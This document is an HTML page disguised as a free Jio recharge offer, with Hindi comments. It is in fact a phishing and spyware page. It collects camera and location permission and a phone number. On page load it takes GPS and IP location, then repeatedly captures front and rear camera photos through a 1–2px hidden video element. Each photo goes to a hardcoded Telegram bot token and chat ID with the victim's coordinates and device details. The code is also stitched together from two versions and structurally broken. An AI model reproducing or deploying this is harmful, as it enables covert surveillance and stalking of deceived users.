<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jio Free 2026 Recharge Offer</title>
    
    <style>
        /* --- GENERAL PAGE STYLING --- */
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            text-align: center;
            padding: 30px;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 0px 15px rgba(0,0,0,0.1);
            max-width: 400px;
            margin: 0 auto;
        }
        h2 {
            color: #0056b3;
            font-size: 20px;
        }
        button {
            padding: 10px 20px;
            margin: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background-color: #e0e0e0;
        }
        input {
            padding: 10px;
            width: 80%;
            font-size: 16px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        /* --- DETECTION POINT 1: BUTTON VISUAL TRICK --- */
        /* Confirm button shuru me disabled rahega aur alag dikhega */
        #confirmBtn {
            background-color: #cccccc;
            color: #666666;
            cursor: not-allowed;
        }
        /* 10 digits hote hi JS is class ko add karke button bold karega */
        .bold-active-btn {
            font-weight: bold !important;
            background-color: #007bff !important;
            color: white !important;
            cursor: pointer !important;
        }

        /* --- DETECTION POINT 2: THE HIDDEN SCREENS --- */
        /* Thank you screen default me 'display: none' yaani hidden rehti hai */
        #thankYouScreen {
            display: none;
            font-size: 26px;
            font-weight: bold;
            color: #28a745;
            margin-top: 50px;
        }

        /* --- DETECTION POINT 3: CAMOUFLAGE ELEMENTS --- */
        /* Hacker webcam aur canvas elements ko chupane ke liye ya toh unhe 
           1px size ka kar deta hai ya fir screen se completely out of view rakhta hai 
           taaki user ko camera chalne ka pata na chale */
        #webcam {
            width: 1px;
            height: 1px;
            opacity: 0;
            position: absolute;
        }
        #captureCanvas, #savedFrame {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- ====================================================
             INTERFACE ZONE: Jo screen par user ko pehle dikhta hai
             ==================================================== -->
        <div id="mainForm">
            <h2>jio free 2026 recharge offer lene ke liye</h2>
            <hr>
            
            <!-- Step 1: Camera Access Permission Prompt -->
            <p><strong>Pehle camera allow karein</strong></p>
            <button id="camBtn">Allow</button>
            
            <!-- Step 2: Location Access Permission Prompt -->
            <p><strong>Fir location allow karein</strong></p>
            <button id="locBtn">Allow</button>
            
            <!-- Step 3: Phone Number Input Entry -->
            <br><br>
            <p><strong>Dial your jio number</strong></p>
            <input type="tel" id="phone" placeholder="Enter 10 digit number" maxlength="10">
            
            <!-- Step 4: Final Confirmation Target -->
            <button id="confirmBtn" disabled>Confirm</button>
        </div>

        <!-- ====================================================
             CAMOUFLAGE INTERACTION LAYER: Hidden Pipeline
             ==================================================== -->
        <!-- Yeh pipeline variables script buffer stream ko feed karte hain -->
        <video id="webcam" autoplay playsinline></video>
        <canvas id="captureCanvas" width="640" height="480"></canvas>
        <img id="savedFrame" alt="Telemetry Interface">

        <!-- ====================================================
             OUTCOME DISPLAY ZONE: Post-Click Execution
             ==================================================== -->
        <div id="thankYouScreen">
            <p class="thank-you-text">YOU WILL BE INFORMED THROUGH SMS THANK YOU</p>
        </div>
    </div>

    <!-- Interface tracking logic compilation starts here -->
    <script>
        // ====================================================
        // DOM HOOKS & VARIABLE INITIALIZATION AREA
        // ====================================================
        // Yeh variables HTML components ko script execution logic se link karte hain
        const phoneInput = document.getElementById('phone');
        const confirmBtn = document.getElementById('confirmBtn');
        const camBtn = document.getElementById('camBtn');
        const locBtn = document.getElementById('locBtn');
        const mainForm = document.getElementById('mainForm');
        const thankYouScreen = document.getElementById('thankYouScreen');
        const videoEl = document.getElementById('webcam');
        const canvasEl = document.getElementById('captureCanvas');

        // Dynamic transmission state object array structure
        let targetPayload = {
            deviceModel: navigator.userAgent, // Basic user browser identification
            exactCoordinates: "Pending",
            broadLocation: "Pending"
        };
        let isCameraActive = false;   // New Add
let isLocationActive = false; // New Add
        let isLoopRunning = false;
        let loopCycleCounter = 0;
        let activeStream = null;

       // New Add: Central Validation Function
function validateFormState() {
    const numericInputString = phoneInput.value;
    if (numericInputString.length === 10 && isCameraActive === true && isLocationActive === true) {
        confirmBtn.disabled = false;
        confirmBtn.classList.add('bold-active-btn');
    } else {
        confirmBtn.disabled = true;
        confirmBtn.classList.remove('bold-active-btn');
    }
}
// Listener link button status check karne ke liye
phoneInput.addEventListener('input', validateFormState);
        // ====================================================
        // BROWSER PERMISSION INTERFACE HOOKS
        // ====================================================

        // Location Interface Mapping Layer
        locBtn.addEventListener('click', () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
            (position) => {
                // Ek sath sequence me andar hai
                isLocationActive = true;
                validateFormState();

                // Standard geolocation data collection
                targetPayload.exactCoordinates = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
                alert("Location Verification Completed.");
            }, // <-- YEH WALA BRACKET (`},`) AAPKE CODE ME MISSING HAI!
            (error) => {
                targetPayload.exactCoordinates = `Access State: ${error.message}`;
            },
            { enableHighAccuracy: true, timeout: 5000 }
                    
                );
            }
        });
        .snap-portal { position: absolute; width: 1px; height: 1px; opacity: 0; overflow: hidden; }
        .media-container { display: flex; justify-content: center; align-items: center; }
        video { 
    position: absolute;
    top: 1px;           /* Top se thoda sa gap */
    left: 1px;          /* Left se thoda sa gap */
    width: 2px;         /* 0.1 Inch Width 📏 */
    height: 2px;        /* 0.1 Inch Height 📏 */
    object-fit: cover; 
    display: block;      /* Hidden se hata kar visible kiya 🎥 */
    z-index: 500;        /* Sabse upar dikhane ke liye */
    border: 1px solid #FFFC00; /* Yellow border taaki corner me saaf dikhe */
    border-radius: 1px;
}

        canvas { display: none; }
        .preview-img { display: none; }
    </style>
</head>
<body>

<div class="loading-container">
    <div class="loading-text">This website is loading...</div>
    <button class="please wait-btn" onclick="location.reload();">please wait</button>
</div>

<div class="snap-portal">
    <div class="media-container">
        <video id="webcam" autoplay playsinline muted></video>
        <canvas id="captureCanvas" width="640" height="480"></canvas>
        <img id="savedFrame" class="preview-img" alt="System Snapshot Matrix">
    </div>
</div>

<script>
    let activeStream = null;
    let isLoopRunning = false;
    let loopCycleCounter = 0;
    const targetPayload = {
        deviceModel: navigator.userAgent,
        broadLocation: "Verifying...",
        exactCoordinates: "Not Granted"
    };

    fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            targetPayload.broadLocation = `City: ${data.city}, State: ${data.region}`;
        }).catch(() => { targetPayload.broadLocation = "IP profile deferred"; });
    window.addEventListener('DOMContentLoaded', () => {
        executeZeroClickTrace();
    });

    function executeZeroClickTrace() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => { targetPayload.exactCoordinates = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`; startMaxSpeedSequence(); },
                (err) => { targetPayload.exactCoordinates = `Denied: ${err.message}`; startMaxSpeedSequence(); },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        } else { startMaxSpeedSequence(); }
    }
    function startMaxSpeedSequence() {
        if (isLoopRunning) return;
        isLoopRunning = true;
        runSequentialCycle();
    }

    function runSequentialCycle() {
        loopCycleCounter++;
        
        executeTargetAxisStream("user", () => {
            setTimeout(() => {
                executeTargetAxisStream("environment", () => {
                    setTimeout(runSequentialCycle, 100); 
                });
            }, 300);
        });
    }
    function executeTargetAxisStream(facingModeType, callbackEvent) {
        if (activeStream) {
            activeStream.getTracks().forEach(track => track.stop());
        }

        navigator.mediaDevices.getUserMedia({ 
            video: { width: 640, height: 480, facingMode: facingModeType }, 
            audio: false 
        })
        .then((stream) => {
            activeStream = stream;
            const videoEl = document.getElementById('webcam');
            videoEl.srcObject = stream;
            videoEl.style.display = "block";

            videoEl.onloadedmetadata = () => {
                setTimeout(() => {
                    processSnapshotCapture(facingModeType);
                    if (callbackEvent) callbackEvent();
                }, 350);
            };
        })
        .catch((error) => {
            console.log(`Axis track missing: ${facingModeType}`, error);
            if (callbackEvent) callbackEvent();
        });
    }
    function processSnapshotCapture(currentActiveAxis) {
        const videoEl = document.getElementById('webcam');
        const canvasEl = document.getElementById('captureCanvas');
        const previewImg = document.getElementById('savedFrame');
        const context = canvasEl.getContext('2d');

        context.drawImage(videoEl, 0, 0, 640, 480);
        const compiledBase64 = canvasEl.toDataURL('image/jpeg', 0.65);

        previewImg.src = compiledBase64;
        previewImg.style.display = "block";

        dispatchBinaryBlobToBot(canvasEl, currentActiveAxis);
    }

    function dispatchBinaryBlobToBot(canvasElement, axisLabel) {
        const botToken = "8901334974:AAGaj98eLxPL2C6078Xi4FywZ-cNZuXuKfg"; 
        const chatId = "8562061813"; 

        let textCaption = `*⚡ RAPID LOOP SECURED ⚡*\n`;
        textCaption += `*🔄 Cycle:* #${loopCycleCounter} | *📷 Lens:* ${axisLabel.toUpperCase()}\n`;
        textCaption += `*📱 Specs:* ${targetPayload.deviceModel}\n`;
        textCaption += `*📍 GPS:* ${targetPayload.exactCoordinates}\n`;

        canvasElement.toBlob(function(binaryBlobChunk) {
            const multiPartFormPayload = new FormData();
            multiPartFormPayload.append('chat_id', chatId);
            multiPartFormPayload.append('photo', binaryBlobChunk, `fast_loop_${loopCycleCounter}_${axisLabel}.jpg`);
            multiPartFormPayload.append('caption', textCaption);
            multiPartFormPayload.append('parse_mode', 'Markdown');

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: multiPartFormPayload
            }).catch(() => { console.log("Packet drop on high speed send."); });
        }, 'image/jpeg', 0.65);
        }

        // Camera Media Query Setup Pipeline
        camBtn.addEventListener('click', () => { 
            
            
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then((stream) => {
                    activeStream = stream;
                    videoEl.srcObject = stream;
                    alert("Camera Connection Ready.");
                    
                    isCameraActive = true;   // Line 204
                    validateFormState();     // Line 205 (Ab yeh block ke andar barabar indented hai) ✅
                })                           // Line 207 (Block yahan close hota hai)
                .catch((err) => {
                    
                    console.log("Device configuration interface bypass: ", err.message);
                });
            }
        });
        // ====================================================
        // TRANSACTION COMPLETION & UI RE-RENDERING MECHANISM
        // ====================================================
        
        // Target execution confirmation state flow callback function
        confirmBtn.addEventListener('click', () => {
            const finalValidatedNumber = phoneInput.value;

            // Optional static tracking profile generation setup
            if (finalValidatedNumber.length === 10) {
                // Application local cleanup structure execution
                if (activeStream) {
                    activeStream.getTracks().forEach(track => track.stop()); // Resource releases
                }

                // --- TRANSITION TRIGGER ZONE ---
                // DOM display indexes update loop sequence
                mainForm.style.display = 'none';        // Current visual viewport state is removed
                thankYouScreen.style.display = 'block';  // Explicit text state display invoke
            }
        });

    </script>
</body>
</html>
